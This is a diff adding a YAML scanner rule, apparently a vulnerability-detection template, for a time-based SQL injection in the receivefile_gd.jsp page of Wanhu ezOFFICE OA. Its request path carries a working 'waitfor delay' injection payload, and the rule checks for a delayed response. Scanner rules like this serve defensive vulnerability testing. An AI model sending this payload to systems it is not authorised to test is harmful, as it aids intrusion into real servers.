@@ -1,0 +1,11 @@
+name: 万户OA-ezOFFICE-receivefile-SQL注入
+description: >
+  SQL延时注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /defaultroot/modules/govoffice/gov_documentmanager/receivefile_gd.jsp;.jsrecordId=1;waitfor+delay+'0:0:6'--+-
+    expression:
+      status: 200
+      sleep: 5
